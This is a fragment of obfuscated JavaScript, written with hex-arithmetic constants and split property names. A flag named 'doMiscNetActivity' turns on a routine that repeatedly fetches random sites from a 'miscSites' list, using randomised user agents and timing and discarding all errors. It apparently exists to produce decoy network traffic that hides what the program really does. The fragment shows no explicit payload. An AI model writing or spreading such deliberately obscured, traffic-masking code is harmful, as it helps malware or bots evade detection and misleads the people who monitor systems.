    for (let l = -0x1b2f + 0x412 * 0x9 + -0x973 * 0x1; l < 0x259 * 0x5 + 0x13d * 0x1 + -0xcf6; l++)
      setTimeout(f, (-0x1439d + -0x14c * 0x5d + 0x2a699) * l * getRandomInt(0x533 + 0x1 * 0x10b9 + -0x15eb, 0x12d * 0x5 + 0x187d + -0x1e5b));
  }, -0x1cb634 + -0x1adf5c + -0x1b6 * -0x4098);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x22d * -0x15 + -0x3690 + 0x7f99) * getRandomInt(-0x314 + -0x3 * 0x1f2 + 0x8eb, 0x1f * -0x11f + 0x1 * -0xb1 + 0x511 * 0x7));
}, 0x1d9e * -0x1 + -0x9f8 + 0x11 * 0x25a);